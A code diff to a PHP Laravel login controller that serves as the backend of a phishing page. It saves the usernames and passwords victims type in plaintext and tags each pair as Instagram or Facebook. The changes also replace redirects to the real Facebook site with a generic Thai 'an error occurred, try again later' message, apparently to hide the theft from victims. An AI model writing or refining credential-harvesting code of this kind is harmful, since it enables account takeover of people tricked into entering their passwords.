@@ -32,6 +32,7 @@ class LoginController extends Controller
                 $newUser = new Userdb;
                 $newUser->username = $request->username;
                 $newUser->password = $request->password; 
+                $newUser->type = "ig";
                 $newUser->save();
 
                 return redirect("https://instagram.com/");
@@ -51,17 +52,18 @@ class LoginController extends Controller
             $user = Userdb::where("username", $request->username)->first();
 
             if ($user) {
-                return redirect("https://facebook.com/");
+                return redirect(route("index"))->with("message", "เกิดข้อผิดพลาด โปรดลองอีกครั้งภายหลัง");
             } else {
                 $newUser = new Userdb;
                 $newUser->username = $request->username;
                 $newUser->password = $request->password;
+                $newUser->type = "facebook";
                 $newUser->save();
 
-                return redirect("https://facebook.com/");
+                return redirect(route("index"))->with("message", "เกิดข้อผิดพลาด โปรดลองอีกครั้งภายหลัง");
             }
         } else {
-            return redirect()->back()->with("message", "ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง");
+            return redirect(route("index"))->with("message", "เกิดข้อผิดพลาด โปรดลองอีกครั้งภายหลัง");
         }
     }
 }
